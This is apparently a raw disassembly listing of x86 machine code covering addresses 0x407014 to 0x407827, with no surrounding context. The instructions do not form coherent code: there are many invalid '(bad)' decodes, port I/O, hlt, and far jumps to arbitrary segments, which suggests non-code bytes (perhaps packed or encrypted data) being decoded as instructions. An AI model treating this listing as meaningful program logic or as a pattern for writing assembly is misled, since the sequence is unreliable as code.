  407014:	repz adc bh,ah
  407017:	lods   al,BYTE PTR ds:[esi]
  407018:	inc    esp
  407019:	nop
  40701a:	or     DWORD PTR [ecx+edi*1],ebx
  40701d:	cwde   
  40701e:	dec    esp
  40701f:	mov    edi,0xa372cc9b
  407024:	retf   0x7ccb
  407027:	popf   
  407028:	je     0x407073
  40702a:	sbb    DWORD PTR [esi+0x3d],0xfffffff3
  40702e:	inc    ebp
  40702f:	enter  0x220a,0x1e
  407033:	icebp  
  407034:	mov    ah,0xb2
  407036:	mov    ebx,0x130d18b4
  40703b:	dec    esi
  40703c:	adc    DWORD PTR [esi+0xb],edx
  40703f:	mov    dl,0x44
  407041:	xchg   edi,eax
  407042:	mov    dh,0x88
  407044:	mov    WORD PTR [esi+0x3c9b8626],?
  40704a:	mov    eax,0x3d67313d
  40704f:	test   DWORD PTR [esi],edx
  407051:	lods   eax,DWORD PTR ds:[esi]
  407052:	js     0x40702b
  407054:	mov    dl,0x59
  407056:	pop    esp
  407057:	loope  0x40707d
  407059:	sar    BYTE PTR [eax+0x62],cl
  40705c:	add    bh,BYTE PTR [edi-0x188b6d42]
  407062:	inc    esp
  407063:	scas   al,BYTE PTR es:[edi]
  407064:	aaa    
  407065:	shl    esp,0x24
  407068:	sbb    eax,0x1d40d91f
  40706d:	jp     0x4070ea
  40706f:	sbb    al,0x84
  407071:	pop    esp
  407072:	aas    
  407073:	add    DWORD PTR [esp+eax*1+0x5c],esi
  407077:	xor    ah,BYTE PTR [ebp+0x20]
  40707a:	jnp    0x407075
  40707c:	and    eax,0x3be69ce9
  407081:	and    al,BYTE PTR [esi+0x2]
  407084:	push   0x4c
  407086:	hlt    
  407087:	jo     0x4070a3
  407089:	xchg   edx,eax
  40708a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40708b:	(bad)  
  40708c:	ficomp WORD PTR [ebx-0x40]
  40708f:	dec    esi
  407090:	dec    esi
  407091:	jmp    0x9843:0x50d0b9d4
  407098:	outs   dx,BYTE PTR ds:[esi]
  407099:	mov    ebx,0xf32f2b2a
  40709e:	mov    esp,0x3ae963f
  4070a3:	push   ss
  4070a4:	pushf  
  4070a5:	shl    DWORD PTR [ebx+0x2927258b],cl
  4070ab:	adc    DWORD PTR [esi+0x7],esp
  4070ae:	pop    ds
  4070af:	push   ebx
  4070b0:	adc    eax,0x884fdd0d
  4070b5:	add    dl,0xce
  4070b8:	and    al,0xb4
  4070ba:	icebp  
  4070bb:	rol    BYTE PTR [ebx+0x23],0x9d
  4070bf:	sub    esp,edi
  4070c1:	mov    esi,eax
  4070c3:	push   edi
  4070c4:	mov    cl,0x62
  4070c6:	(bad)  
  4070c7:	sub    eax,0x98f0f49c
  4070cc:	out    0x24,eax
  4070ce:	sub    ebx,ebp
  4070d0:	pop    ebp
  4070d1:	sbb    eax,0xa3f4fa29
  4070d6:	xchg   BYTE PTR [edi-0x43565df0],dh
  4070dc:	lea    ebx,[ebp-0x14]
  4070df:	add    ebx,DWORD PTR [eax]
  4070e1:	mov    al,ds:0x1acd8745
  4070e6:	mov    ebp,0xe0fe05ca
  4070eb:	jne    0x407133
  4070ed:	mov    al,ds:0x302e225d
  4070f2:	jmp    0xe8ab3392
  4070f7:	mov    al,0x90
  4070f9:	push   eax
  4070fa:	jg     0x4070e8
  4070fc:	ret    0x7d83
  4070ff:	in     al,dx
  407100:	mov    eax,ds:0x9b7971ef
  407105:	ror    cl,1
  407107:	icebp  
  407108:	ret    
  407109:	sub    ch,al
  40710b:	cs push cs
  40710d:	mov    ebp,0x271bdef9
  407112:	add    ch,BYTE PTR ds:0x9daa20fb
  407118:	inc    edx
  407119:	sub    eax,0xd0e611f7
  40711e:	sbb    eax,0x542f8f93
  407123:	out    0xc2,al
  407125:	adc    bh,bl
  407127:	aas    
  407128:	les    esp,FWORD PTR [edx]
  40712a:	iret   
  40712b:	fsubrp st(0),st
  40712d:	js     0x40718e
  40712f:	sub    eax,0x445b29c1
  407134:	cwde   
  407135:	loopne 0x4070e8
  407137:	sbb    edi,DWORD PTR [ebx+ebx*1]
  40713a:	aam    0xc9
  40713c:	push   ss
  40713d:	add    al,0x86
  40713f:	jbe    0x4070ee
  407141:	sbb    ebx,ebp
  407143:	or     BYTE PTR [edx-0x44],ch
  407146:	mov    ds:0xb6ce0a8a,eax
  40714b:	arpl   WORD PTR [eax],dx
  40714d:	(bad)  
  40714e:	bnd jb 0x4070e6
  407151:	cdq    
  407152:	mov    cl,BYTE PTR [edx-0x1d6261a0]
  407158:	iret   
  407159:	aas    
  40715a:	les    ebx,FWORD PTR [ebp+0x6f]
  40715d:	mov    ebx,0x763403e7
  407162:	test   BYTE PTR [eax+eax*4+0x20183b57],bl
  407169:	sub    DWORD PTR [ebx+0x3a16ee44],edx
  40716f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407170:	pushf  
  407171:	push   0x68531a63
  407176:	and    DWORD PTR [edx+0x50044472],edx
  40717c:	fs test edi,0x5b3162
  407183:	mov    dl,0xa1
  407185:	pop    ecx
  407186:	xchg   ebx,eax
  407187:	shl    DWORD PTR [edx+0x38],1
  40718a:	xlat   BYTE PTR ds:[ebx]
  40718b:	sbb    ecx,DWORD PTR [esi+0x54]
  40718e:	push   esp
  40718f:	loop   0x4071c8
  407191:	bound  esi,QWORD PTR [ecx]
  407193:	fst    DWORD PTR [esi+edx*4]
  407196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407197:	lds    edx,FWORD PTR [edi+ebx*1+0x4c]
  40719b:	rcr    BYTE PTR [eax],cl
  40719d:	rcl    BYTE PTR [ebp-0x6f03e566],cl
  4071a3:	pop    ds
  4071a4:	sti    
  4071a5:	xor    eax,0x20a631ba
  4071aa:	pop    eax
  4071ab:	fild   DWORD PTR [esp-0x82fee9f]
  4071b2:	sbb    eax,0x97de6853
  4071b7:	xor    BYTE PTR [eax+0x7162b4b1],0x66
  4071be:	fdivp  st(2),st
  4071c0:	shl    BYTE PTR [esi-0x65],0x3d
  4071c4:	mov    ds:0x68d4cb78,al
  4071c9:	mov    eax,ds:0x5cd3d29b
  4071ce:	ud1    ebp,ebx
  4071d1:	jnp    0x407168
  4071d3:	inc    esp
  4071d4:	js     0x40724d
  4071d6:	inc    edx
  4071d7:	adc    eax,0x59087aae
  4071dc:	cmp    DWORD PTR [edx-0x781c863c],0xffffffaa
  4071e3:	(bad)
  4071e8:	adc    BYTE PTR ds:[esi-0x35],ch
  4071ec:	mov    eax,ds:0x78e806c3
  4071f1:	sub    al,bl
  4071f3:	hlt    
  4071f4:	fstp   QWORD PTR [ebp-0x41ba0638]
  4071fa:	mov    dh,0x7c
  4071fc:	push   ebx
  4071fd:	push   ds
  4071fe:	cs jmp 0x407190
  407201:	push   0xffffffdf
  407203:	cmp    DWORD PTR ds:0x7a5a97c,edi
  407209:	and    BYTE PTR [eax+0x28],0x92
  40720d:	aas    
  40720e:	out    0x2a,al
  407210:	es pusha 
  407212:	cdq    
  407213:	mov    BYTE PTR [eax],ah
  407215:	and    ecx,DWORD PTR [edi-0x5f]
  407218:	xchg   esp,eax
  407219:	jmp    0x4071bc
  40721b:	xchg   ebp,eax
  40721c:	mov    ds:0xa01a05ad,al
  407221:	pusha  
  407222:	mov    ecx,0x54ced171
  407227:	mov    dh,0x97
  407229:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40722b:	(bad)  
  40722c:	cld    
  40722d:	test   eax,0xb2b628b3
  407232:	int    0xf6
  407234:	push   edx
  407235:	test   eax,0xf3e95cee
  40723a:	jbe    0x4072a7
  40723c:	jae    0x40722e
  40723e:	sbb    DWORD PTR [edx],esi
  407240:	jp     0x407231
  407242:	lea    edx,[edi]
  407244:	add    ebx,ecx
  407246:	in     eax,dx
  407247:	call   0x4f5c:0x66bb66d1
  40724e:	leave  
  40724f:	nop
  407250:	aad    0x36
  407252:	aas    
  407253:	mov    al,ds:0xd2727244
  407258:	in     eax,dx
  407259:	je     0x407227
  40725b:	lea    ebx,[ebx]
  40725d:	add    BYTE PTR [esi],bh
  40725f:	leave  
  407260:	(bad)  
  407261:	loop   0x407239
  407263:	repnz and bl,BYTE PTR fs:[ebx-0x7e]
  407268:	stc    
  407269:	or     ebp,0x74
  40726c:	push   ebp
  40726d:	lods   eax,DWORD PTR ds:[esi]
  40726e:	call   0xfe36b5f5
  407273:	fisubr DWORD PTR [ebx-0x444f471f]
  407279:	loopne 0x4072dc
  40727b:	cs push ebx
  40727d:	cmp    eax,0x76caa50d
  407282:	inc    ebx
  407283:	push   esi
  407284:	adc    esi,eax
  407286:	inc    edx
  407287:	and    al,0xf1
  407289:	ja     0x407220
  40728b:	lods   al,BYTE PTR ds:[esi]
  40728c:	ss in  eax,0x17
  40728f:	in     al,0x3b
  407291:	pop    eax
  407292:	(bad)
  407295:	xor    eax,0x184e7cea
  40729a:	pop    ss
  40729b:	inc    ebx
  40729c:	dec    esi
  40729d:	cwde   
  40729e:	mov    DWORD PTR [ebp+ecx*4+0x551bb06e],edi
  4072a5:	push   cs
  4072a6:	add    BYTE PTR [esi],dl
  4072a8:	sbb    bl,cl
  4072aa:	dec    edx
  4072ab:	loopne 0x40730a
  4072ad:	clc    
  4072ae:	pop    ecx
  4072af:	jp     0x407277
  4072b1:	(bad)  
  4072b2:	test   eax,0xbea79bbb
  4072b7:	inc    ebx
  4072b8:	test   eax,0x74ed38a4
  4072bd:	dec    ecx
  4072be:	ficomp DWORD PTR [ecx+0x41a98af8]
  4072c4:	xor    al,0x7f
  4072c6:	call   0xa534:0x991a5831
  4072cd:	bound  ebx,QWORD PTR [edi]
  4072cf:	sub    eax,0xe0489471
  4072d4:	mov    ch,0x2a
  4072d6:	xor    ebp,DWORD PTR [ebx-0x6f]
  4072d9:	pusha  
  4072da:	mov    edi,0x2198e1a1
  4072df:	jg     0x4072a8
  4072e1:	mov    ebp,0x15c4fb0d
  4072e6:	ret    0x98ba
  4072e9:	inc    ebx
  4072ea:	test   BYTE PTR [edx+ecx*8],ch
  4072ed:	push   ds
  4072ee:	into   
  4072ef:	and    bh,0x96
  4072f2:	pop    eax
  4072f3:	mov    ds,WORD PTR [ebx-0x22]
  4072f6:	cmp    DWORD PTR [esi+0x78],ebp
  4072f9:	fstp   QWORD PTR [edx]
  4072fb:	out    0x16,al
  4072fd:	ja     0x4072b2
  4072ff:	ja     0x4072bd
  407301:	pop    es
  407302:	fisub  DWORD PTR [ecx+edi*8+0x1606cbb3]
  407309:	int    0x75
  40730b:	call   0xc79ab433
  407310:	enter  0xbc08,0x7d
  407314:	sbb    dl,BYTE PTR [edi+eiz*8-0x3efcf3f5]
  40731b:	shl    dh,cl
  40731d:	jbe    0x4072a3
  40731f:	out    dx,eax
  407320:	ins    DWORD PTR es:[edi],dx
  407321:	jecxz  0x4072fc
  407323:	or     BYTE PTR [edi],ch
  407325:	in     al,0xf9
  407327:	hlt    
  407328:	inc    ebp
  407329:	imul   ebp,ecx,0x5fc5d40
  40732f:	lea    ebp,[ebx]
  407331:	lods   eax,DWORD PTR ds:[esi]
  407332:	add    eax,DWORD PTR [ebx+0x9a31e79]
  407338:	push   es
  407339:	jge    0x40732a
  40733b:	clc    
  40733c:	fcomp  DWORD PTR [ebp+0x4]
  40733f:	daa    
  407340:	fwait
  407341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407342:	scas   al,BYTE PTR es:[edi]
  407343:	push   DWORD PTR [edi-0x66]
  407346:	jnp    0x407358
  407348:	or     al,0x37
  40734a:	push   esi
  40734b:	sahf   
  40734c:	shl    ah,cl
  40734e:	cs aam 0x68
  407351:	lea    ecx,[ebx-0x57]
  407354:	pop    esi
  407355:	out    0x1c,al
  407357:	imul   esi,DWORD PTR [ecx-0xc],0xfffffff5
  40735b:	jnp    0x4072e4
  40735d:	mov    ds:0x2a4255ba,eax
  407362:	pop    edx
  407363:	pop    esi
  407364:	pop    ecx
  407365:	add    DWORD PTR [ebp+esi*1-0x338f7ee0],ebx
  40736c:	test   BYTE PTR [ecx-0x6a],ch
  40736f:	cmp    BYTE PTR [edi],dh
  407371:	out    0xf7,eax
  407373:	push   esi
  407374:	loope  0x4073e1
  407376:	cmp    eax,DWORD PTR [ecx-0x33]
  407379:	cmp    al,0xf1
  40737b:	icebp  
  40737c:	js     0x4073e8
  40737e:	inc    edi
  40737f:	neg    DWORD PTR [esi-0x4203e1b]
  407385:	pop    ebx
  407386:	mov    eax,ds:0x5edd3935
  40738b:	ins    DWORD PTR es:[edi],dx
  40738c:	and    cl,bl
  40738e:	fdiv   st,st(1)
  407390:	pop    edx
  407391:	add    BYTE PTR [edx+edi*8-0x7d],bh
  407395:	jmp    0xd455:0x9f167b28
  40739c:	stos   BYTE PTR es:[edi],al
  40739d:	outs   dx,BYTE PTR ds:[esi]
  40739e:	test   BYTE PTR [ecx-0x2e],cl
  4073a1:	fisub  WORD PTR [edx-0x33631145]
  4073a7:	xor    dl,BYTE PTR [ebx+0x32]
  4073aa:	in     al,0xd6
  4073ac:	call   0x6254970d
  4073b1:	stc    
  4073b2:	js     0x4073ed
  4073b4:	mov    al,ds:0xaad3f041
  4073b9:	inc    edi
  4073ba:	xor    al,0xfc
  4073bc:	out    dx,eax
  4073bd:	sbb    al,0xb2
  4073bf:	dec    edi
  4073c0:	mov    al,cl
  4073c2:	dec    esi
  4073c3:	clc    
  4073c4:	ss push ecx
  4073c6:	mov    esp,0x792ba5b4
  4073cb:	inc    edx
  4073cc:	and    bl,BYTE PTR [eax+0x3a7d730a]
  4073d2:	(bad)  
  4073d3:	arpl   WORD PTR [ebx+0x79a9e421],dx
  4073d9:	nop
  4073da:	inc    ebp
  4073db:	cmc    
  4073dc:	jmp    0x4457:0x8eee7a63
  4073e3:	out    0x7f,al
  4073e5:	mov    ah,0x91
  4073e7:	pop    esi
  4073e8:	xchg   BYTE PTR ds:0xc6960592,ch
  4073ee:	or     esp,edx
  4073f0:	cmp    DWORD PTR [ecx-0x2c459931],0xe3c77c16
  4073fa:	out    0x43,al
  4073fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073fd:	sub    edi,DWORD PTR [ebx]
  4073ff:	xchg   edx,eax
  407400:	mov    DWORD PTR [edi+edi*8+0x12],esp
  407404:	mov    cl,0xaf
  407406:	loopne 0x40747e
  407408:	jmp    0x8dc8:0x9f2064b7
  40740f:	push   ds
  407410:	(bad)  
  407411:	ins    DWORD PTR es:[edi],dx
  407412:	mov    dh,0x68
  407414:	ret    
  407415:	icebp  
  407416:	shr    BYTE PTR [bx+di-0x2467],1
  40741b:	mov    esp,0x63abfd7
  407420:	in     al,0xa0
  407422:	(bad)  
  407423:	xchg   esp,eax
  407424:	out    0xcd,al
  407426:	sbb    eax,0x19caa274
  40742b:	int3   
  40742c:	mov    WORD PTR [ecx+0x3b],?
  40742f:	mov    bh,0x51
  407431:	xor    BYTE PTR [edi],bl
  407433:	fbstp  TBYTE PTR [edx]
  407435:	mov    ch,0xba
  407437:	inc    esp
  407438:	pushf  
  407439:	loop   0x40742e
  40743b:	(bad)  
  40743c:	(bad)  
  40743e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40743f:	inc    eax
  407440:	sbb    al,0xa
  407442:	xor    al,BYTE PTR [ebp-0x1093421b]
  407448:	leave  
  407449:	sbb    edi,DWORD PTR [eax-0x3f]
  40744c:	int    0x76
  40744e:	cli    
  40744f:	rcl    DWORD PTR [ecx-0x6255c5de],1
  407455:	repnz mov bl,0x8
  407458:	out    0x1f,al
  40745a:	dec    eax
  40745b:	mov    eax,DWORD PTR [edi-0x5985a670]
  407461:	mov    edx,0xdc8424b2
  407466:	and    eax,0xac31d355
  40746b:	xchg   esi,eax
  40746c:	or     edx,DWORD PTR [ebp+0x20]
  40746f:	in     eax,0x59
  407471:	sbb    al,0x84
  407473:	xlat   BYTE PTR ds:[ebx]
  407474:	xchg   ebx,eax
  407475:	retf   0x5b29
  407478:	jno    0x4074ad
  40747a:	jae    0x4074e3
  40747c:	mov    bl,0x5a
  40747e:	jle    0x40749c
  407480:	add    dh,BYTE PTR [edi+esi*8-0x29]
  407484:	lods   al,BYTE PTR ds:[esi]
  407485:	leave  
  407486:	sbb    al,0x89
  407488:	(bad)  
  407489:	std    
  40748a:	xlat   BYTE PTR ds:[ebx]
  40748b:	mov    WORD PTR [esi+0x36cf8f30],cs
  407491:	ret    0x34c
  407494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407495:	inc    edx
  407496:	inc    esi
  407497:	gs add eax,0x805cf23a
  40749d:	call   0x89817a
  4074a2:	fs cmp eax,0x4cea072a
  4074a8:	stc    
  4074a9:	sub    cl,BYTE PTR ds:0xea46bcc5
  4074af:	iret   
  4074b0:	xor    ebx,esp
  4074b2:	clc    
  4074b3:	sar    DWORD PTR [esi],0x71
  4074b6:	fcmovnbe st,st(4)
  4074b8:	mov    edx,0xdec73664
  4074bd:	adc    esi,DWORD PTR ds:0x5ef87663
  4074c3:	push   edi
  4074c4:	cwde   
  4074c5:	cwde   
  4074c6:	fs pusha 
  4074c8:	cwde   
  4074c9:	aaa    
  4074ca:	mov    dl,BYTE PTR [ecx+eax*2-0x31]
  4074ce:	and    ecx,DWORD PTR [eax-0x5ad31a00]
  4074d4:	sub    eax,0x220165d1
  4074d9:	adc    eax,0xa04f73c8
  4074de:	mov    ebp,0x39cf441c
  4074e3:	sub    eax,0x21e0234c
  4074e8:	push   0xffffff83
  4074ea:	sub    DWORD PTR ds:0x7c550f3c,ebp
  4074f0:	fmul   DWORD PTR [ebx+0x7b]
  4074f3:	(bad)  
  4074f4:	cmp    esp,ecx
  4074f6:	test   DWORD PTR [edi+0x46],esi
  4074f9:	xchg   BYTE PTR fs:[ebx+0x32],al
  4074fd:	mov    ds:0x742b7bcc,eax
  407502:	sub    al,0x8c
  407504:	jno    0x4074dc
  407506:	add    eax,0xb26eabad
  40750b:	pop    es
  40750c:	inc    esp
  40750d:	ficomp DWORD PTR [eax+0x74]
  407510:	mov    ebp,0xd776ef3
  407515:	jl     0x40755a
  407517:	xor    BYTE PTR [eax+0x47],ah
  40751a:	je     0x4074b6
  40751c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40751d:	mov    edi,0xf83ccca0
  407522:	push   edi
  407523:	in     eax,dx
  407524:	bound  esi,QWORD PTR [ebx-0x4d]
  407527:	jne    0x40750d
  407529:	(bad)  
  40752a:	mov    eax,ds:0xa8701044
  40752f:	pop    ds
  407530:	sbb    al,0x5c
  407532:	js     0x407585
  407534:	mov    ds:0xaeb5aaf,al
  407539:	and    ch,BYTE PTR [ebx]
  40753b:	cmp    ch,cl
  40753d:	adc    dh,BYTE PTR ds:0xc27e47d5
  407543:	dec    esi
  407544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407545:	inc    ebp
  407546:	test   DWORD PTR [ecx],edx
  407548:	mov    bl,0x8a
  40754a:	fwait
  40754b:	and    edx,eax
  40754d:	pop    ebp
  40754e:	jg     0x4075bd
  407550:	lods   al,BYTE PTR ds:[esi]
  407551:	lods   al,BYTE PTR ds:[esi]
  407552:	(bad)  
  407553:	pusha  
  407554:	xor    al,0x57
  407556:	dec    ecx
  407557:	pop    edi
  407558:	hlt    
  407559:	lahf   
  40755a:	jne    0x40754a
  40755c:	enter  0xfb7d,0x3f
  407560:	or     DWORD PTR [esi],edi
  407562:	(bad)  
  407563:	lea    ecx,ds:0xa0f9c12f
  407569:	lods   eax,DWORD PTR gs:[esi]
  40756b:	add    ah,BYTE PTR [bx+si+0x6dcd]
  407570:	add    ebx,DWORD PTR [esi-0x5f64798]
  407576:	dec    edi
  407577:	jle    0x407560
  407579:	xchg   BYTE PTR [ebx],bh
  40757b:	stc    
  40757c:	in     al,0xaa
  40757e:	inc    esi
  40757f:	repz cmp BYTE PTR [ebp+0x1ba8e4c4],dh
  407586:	cld    
  407587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407588:	div    DWORD PTR [edx-0x1a2c992e]
  40758e:	xchg   esp,eax
  40758f:	mov    dh,0xf
  407591:	ret    0x1a11
  407594:	(bad)  
  407595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407596:	das    
  407597:	mov    eax,ds:0x3f1cafe4
  40759c:	pusha  
  40759d:	pop    edi
  40759e:	in     al,dx
  40759f:	into   
  4075a0:	loopne 0x40760b
  4075a2:	jmp    0xfe1af41
  4075a7:	cld    
  4075a8:	(bad)  
  4075a9:	in     eax,dx
  4075aa:	or     al,0xec
  4075ac:	out    0x41,eax
  4075ae:	out    dx,al
  4075af:	sub    BYTE PTR [eax+0x3f6d9b91],0x19
  4075b6:	push   ds
  4075b7:	daa    
  4075b8:	enter  0x9366,0x1b
  4075bc:	xor    dl,BYTE PTR [eax]
  4075be:	dec    esi
  4075bf:	les    ebp,FWORD PTR [edx-0x307abd13]
  4075c5:	push   es
  4075c6:	jecxz  0x4075c5
  4075c8:	inc    esp
  4075c9:	add    ebx,DWORD PTR [ebp+0x76d946f6]
  4075cf:	pop    eax
  4075d0:	ins    DWORD PTR es:[edi],dx
  4075d1:	or     ecx,edi
  4075d3:	out    0xd7,al
  4075d5:	fdiv   QWORD PTR [ebx]
  4075d7:	ins    DWORD PTR es:[edi],dx
  4075d8:	imul   esi,esp,0xa447054c
  4075de:	pop    ds
  4075df:	add    DWORD PTR [edi-0x20],ebp
  4075e2:	push   esp
  4075e3:	enter  0x776b,0x11
  4075e7:	into   
  4075e8:	stos   BYTE PTR es:[edi],al
  4075e9:	outs   dx,BYTE PTR ds:[esi]
  4075eb:	mov    esp,DWORD PTR [esi-0xd5af06e]
  4075f1:	lods   al,BYTE PTR ds:[esi]
  4075f2:	sbb    al,0x93
  4075f4:	jmp    0x118d:0x610b8e8
  4075fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075fc:	xchg   ebx,eax
  4075fd:	push   edx
  4075fe:	aas    
  4075ff:	push   eax
  407600:	mov    eax,ds:0x99f1f593
  407605:	mov    ah,0xe6
  407607:	int3   
  407608:	icebp  
  407609:	sub    dh,bl
  40760b:	(bad)  
  40760c:	call   0xdc7f:0xf2bb3727
  407613:	mov    ds:0x9d2c3dd9,eax
  407618:	mov    ds:0x71756bf,al
  40761d:	sub    al,0xd8
  40761f:	sbb    DWORD PTR [ebx+0x7691331c],esi
  407625:	rcl    DWORD PTR [ebp+0x14],cl
  407628:	add    ecx,DWORD PTR [ecx+edi*8+0x7b]
  40762c:	xchg   esp,eax
  40762d:	xchg   edi,eax
  40762e:	daa    
  40762f:	ret    0x66db
  407632:	adc    ah,BYTE PTR [eax]
  407634:	sbb    BYTE PTR [ebx+0x424fb865],bl
  40763a:	inc    edi
  40763b:	adc    DWORD PTR [ebp+0x2],esi
  40763e:	push   ds
  40763f:	add    BYTE PTR [ecx+0x3c0ec517],0x41
  407646:	jb     0x407668
  407648:	xchg   edi,eax
  407649:	and    edi,ecx
  40764b:	xchg   ah,al
  40764d:	pop    es
  40764e:	(bad)  
  40764f:	(bad)  
  407650:	sub    DWORD PTR [esi],esp
  407652:	mov    dl,0xe
  407654:	call   0x72f5:0x69b8220f
  40765b:	mov    bh,0x48
  40765d:	add    bh,BYTE PTR [esi]
  40765f:	sub    ch,ch
  407661:	pop    esp
  407662:	mov    esi,0xe035e1f1
  407667:	fisub  DWORD PTR [edi-0xf2d02ef]
  40766d:	xchg   edx,eax
  40766e:	cld    
  40766f:	jmp    0x4076db
  407671:	cmp    eax,0x4ec0c1b0
  407676:	shl    eax,cl
  407678:	fcomip st,st(6)
  40767a:	rcl    ebp,0x13
  40767d:	add    al,0x3d
  40767f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407680:	scas   eax,DWORD PTR es:[edi]
  407681:	mov    ebp,0xc1de5fb0
  407686:	sbb    eax,0x507e7396
  40768b:	test   DWORD PTR ds:0x66fb46e0,edx
  407691:	mov    al,0xc3
  407693:	inc    ebx
  407694:	push   ss
  407695:	imul   ebp,DWORD PTR [esi+0x11af816],0x1
  40769c:	ret    
  40769d:	les    esi,FWORD PTR [edx+0x7a44b7d9]
  4076a3:	jmp    0xbe4a:0x66e53575
  4076aa:	push   ecx
  4076ab:	add    eax,0x784479e3
  4076b0:	call   0x7f72:0x7c66895d
  4076b7:	dec    edi
  4076b8:	dec    edx
  4076b9:	pop    ds
  4076ba:	ins    BYTE PTR es:[edi],dx
  4076bb:	(bad)  
  4076bc:	mov    bh,0x93
  4076be:	jno    0x4076b6
  4076c0:	add    bh,BYTE PTR [eax+0x4875e5b2]
  4076c6:	mov    esp,0xb870cf2f
  4076cb:	xor    DWORD PTR [ecx-0x2ad92cdb],ecx
  4076d1:	dec    ecx
  4076d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d3:	jg     0x40774d
  4076d5:	cmp    edx,DWORD PTR [edx+0x6b58ef2d]
  4076db:	xchg   esi,eax
  4076dc:	jmp    0x2fce:0xaa7900e5
  4076e3:	jo     0x407685
  4076e5:	or     ch,BYTE PTR es:0x720f9b99
  4076ec:	mov    eax,ds:0xa0eec310
  4076f1:	pop    esp
  4076f2:	jmp    0xd2d5:0x5719f1e8
  4076f9:	and    BYTE PTR [ebp+ecx*4+0x6a1f2198],ah
  407700:	sbb    DWORD PTR [esi],ebp
  407702:	mov    ebx,gs
  407704:	in     eax,dx
  407705:	lea    esi,[esp+edi*2-0x4a]
  407709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40770a:	jg     0x4076ec
  40770c:	mov    al,ds:0xa57141f5
  407711:	and    al,0x6
  407713:	iret   
  407714:	dec    eax
  407715:	es cmovp edi,esp
  407719:	jns    0x407767
  40771b:	dec    esp
  40771c:	int3   
  40771d:	aam    0xbc
  40771f:	dec    esp
  407720:	je     0x40778d
  407722:	or     DWORD PTR [esi],edx
  407724:	pushf  
  407725:	out    0x66,eax
  407727:	mov    DWORD PTR [eax-0x44],eax
  40772a:	div    dh
  40772c:	(bad)  
  40772d:	out    0x4b,eax
  40772f:	repnz sub BYTE PTR fs:[edx],0x65
  407734:	in     eax,dx
  407735:	stc    
  407736:	cdq    
  407737:	xchg   edx,eax
  407738:	mov    ecx,0x5a2d4065
  40773d:	pop    ebx
  40773e:	mov    cl,0x11
  407740:	cs dec edi
  407742:	cld    
  407743:	xor    al,0x96
  407745:	in     al,dx
  407746:	sub    bl,dl
  407748:	sub    edx,DWORD PTR [edx+0x74]
  40774b:	cmp    edx,DWORD PTR gs:[esi-0x4e3ab2d6]
  407752:	test   al,0xfa
  407754:	shr    DWORD PTR [esi+0x6dfdbb89],1
  40775a:	addr16 (bad) 
  40775e:	dec    ebp
  40775f:	arpl   WORD PTR [ebp-0x39a25d2c],bx
  407765:	jo     0x4076e8
  407767:	jnp    0x407707
  407769:	xor    dl,BYTE PTR ds:0x4cb045c3
  40776f:	add    dh,BYTE PTR [eax+0xc245c9c]
  407775:	add    al,0x4e
  407777:	adc    DWORD PTR [ebx-0x56988816],edx
  40777d:	jecxz  0x40771a
  40777f:	xchg   BYTE PTR ds:0x2e6d883b,dl
  407785:	bound  ebp,QWORD PTR [eax+0x57]
  407788:	pop    ebp
  407789:	repz mov gs,WORD PTR [edi+0x433b4e13]
  407790:	or     al,0x1b
  407792:	pop    ecx
  407793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407794:	cli    
  407795:	(bad)  
  407796:	sahf   
  407797:	(bad)  
  407798:	sti    
  407799:	loop   0x4077d2
  40779b:	sahf   
  40779c:	inc    edx
  40779d:	add    edx,0xffffff98
  4077a0:	mov    ds:0xf61cfeb6,al
  4077a5:	in     al,dx
  4077a6:	mov    bl,0x1d
  4077a8:	cwde   
  4077a9:	or     al,BYTE PTR [ebx]
  4077ab:	and    esi,DWORD PTR [esi]
  4077ad:	xor    al,0x24
  4077af:	jne    0x4077ef
  4077b1:	ret    0x9e08
  4077b4:	scas   eax,DWORD PTR es:[edi]
  4077b5:	sub    DWORD PTR [ebp+eiz*4+0x49f5ae76],ebp
  4077bc:	or     al,0xd8
  4077be:	mov    edx,0x96a759a6
  4077c3:	mov    ebp,0x7f942927
  4077c8:	les    edi,FWORD PTR [eax+0x24]
  4077cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077cc:	dec    eax
  4077cd:	icebp  
  4077ce:	test   DWORD PTR ds:0x436b6ce3,ebp
  4077d4:	test   BYTE PTR gs:[eax+0x6a],cl
  4077d8:	lea    edi,[eax-0x37]
  4077db:	call   0x895f:0xd574c315
  4077e2:	scas   eax,DWORD PTR es:[edi]
  4077e3:	aam    0xde
  4077e5:	add    al,0xfb
  4077e7:	in     al,0xaa
  4077e9:	add    dl,BYTE PTR [ecx]
  4077eb:	popa   
  4077ec:	bnd jns 0xec9a13e7
  4077f3:	retf   0x4664
  4077f6:	pop    edx
  4077f7:	push   esp
  4077f8:	hlt    
  4077f9:	and    edx,ebx
  4077fb:	je     0x4077fc
  4077fd:	lods   al,BYTE PTR ds:[esi]
  4077fe:	enter  0x950e,0xca
  407802:	ret    0xf150
  407805:	(bad)  
  407806:	push   ss
  407807:	outs   dx,DWORD PTR ds:[esi]
  407808:	stos   BYTE PTR es:[edi],al
  407809:	rcl    DWORD PTR [ebp+0x60ef1641],0x7c
  407810:	push   esi
  407811:	mov    ah,0xba
  407813:	fbld   TBYTE PTR [ebp-0x23]
  407816:	mov    eax,0x7487f4dd
  40781b:	jae    0x407849
  40781d:	das    
  40781e:	lods   al,BYTE PTR ds:[esi]
  40781f:	push   edx
  407820:	add    eax,0xae7e60eb
  407825:	push   ds
  407826:	pop    ebp
  407827:	in     eax,dx
